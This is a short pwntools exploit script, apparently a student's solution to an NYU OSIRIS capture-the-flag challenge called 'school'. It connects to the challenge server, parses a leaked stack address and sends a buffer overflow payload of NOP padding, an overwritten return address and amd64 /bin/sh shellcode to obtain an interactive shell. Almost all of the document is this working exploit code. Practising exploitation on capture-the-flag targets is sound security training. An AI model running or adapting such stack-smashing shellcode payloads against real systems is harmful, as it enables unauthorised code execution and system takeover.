#Execute self generated shellcode
#Was too lazy to create my own
#So used a built in python module
#Always a good idea to use built in or third party libraries to implement something that's not in scope
#thank Allah today and everyday 

from pwn import*
#e = ELF('./school')
#p = process('./school')
p = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1338)
p.recv()
p.send("aa6243\n")
#gdb.attach(p)
p.recvuntil(':')
nop = asm('nop', arch="amd64")
addr = p.recvuntil('.')[:-1]
addr = int(addr, 16)
shellstr= asm(shellcraft.amd64.sh(), arch='amd64')
p.sendline(nop*40 + p64(addr+48) + shellstr)   #figured it out using gdb and overflowing the buffer
p.interactive() 
